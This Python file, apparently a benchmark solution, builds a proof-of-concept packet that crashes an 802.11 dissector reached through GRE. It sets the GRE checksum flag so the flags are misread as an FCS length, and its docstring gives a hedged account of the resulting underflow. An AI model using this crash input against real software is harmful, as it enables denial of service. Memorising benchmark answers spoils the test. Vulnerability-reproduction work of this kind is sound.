import sys
import tarfile

class Solution:
    """
    Generates a Proof-of-Concept input that triggers a Stack Buffer Overflow
    vulnerability in the 802.11 dissector when invoked via GRE.
    """
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC that triggers the vulnerability.

        The vulnerability is caused by a type confusion issue. A GRE packet can
        encapsulate an 802.11 frame. The GRE dissector passes a pointer to its
        own header information as a `pseudo_header` to the 802.11 sub-dissector.

        The 802.11 dissector, however, expects a different pseudoheader format
        (e.g., radiotap), which contains fields like `fcs_len`. It misinterprets
        the GRE header's `flags_and_version` field (2 bytes) as `fcs_len`.

        By crafting the GRE header with the "Checksum bit" set (0x8000), we
        force the `fcs_len` to be interpreted as 32768.

        The dissector then calculates the 802.11 frame length as:
        `framelen = packet_length - fcs_len`.

        With a very short packet payload (7 bytes), this calculation results in
        a large negative number due to integer underflow (`7 - 32768`). This
        invalid length is then used in subsequent memory operations (e.g.,
        creating a sub-tvbuff), causing a crash (buffer overflow or read out of bounds).

        The PoC is a 45-byte packet:
        - 14 bytes: Ethernet header
        - 20 bytes: IPv4 header
        - 4 bytes:  GRE header (maliciously crafted)
        - 7 bytes:  Payload (short length to trigger underflow)

        Args:
            src_path: Path to the vulnerable source code tarball (unused).

        Returns:
            bytes: The PoC input that triggers the vulnerability.
        """

        # Ethernet Header (14 bytes)
        # Dst MAC: Broadcast, Src MAC: arbitrary, Type: IPv4
        eth_header = (
            b'\xff\xff\xff\xff\xff\xff'  # Dst MAC
            b'\x00\x00\x00\x00\x00\x00'  # Src MAC
            b'\x08\x00'                  # EtherType: IPv4
        )

        # IP Header (20 bytes)
        # Protocol: GRE (47)
        # Total Length: 20 (IP) + 4 (GRE) + 7 (Payload) = 31 bytes
        ip_header = (
            b'\x45\x00'                  # Version, IHL, ToS
            b'\x00\x1f'                  # Total Length: 31
            b'\x12\x34'                  # Identification
            b'\x00\x00'                  # Flags, Fragment Offset
            b'\x40'                      # TTL: 64
            b'\x2f'                      # Protocol: GRE (47)
            b'\x6a\x7a'                  # Header Checksum (pre-calculated)
            b'\x7f\x00\x00\x01'          # Source IP
            b'\x7f\x00\x00\x01'          # Destination IP
        )

        # GRE Header (4 bytes)
        # Flags/Version: 0x8000 (Checksum bit set) is misread as fcs_len
        # Protocol Type: 0x88b7 (IEEE 802.11) to invoke the vulnerable dissector
        gre_header = (
            b'\x80\x00'
            b'\x88\xb7'
        )

        # Payload (7 bytes)
        # The content is irrelevant; its short length is key to the underflow.
        payload = b'\x00' * 7

        poc = eth_header + ip_header + gre_header + payload

        return poc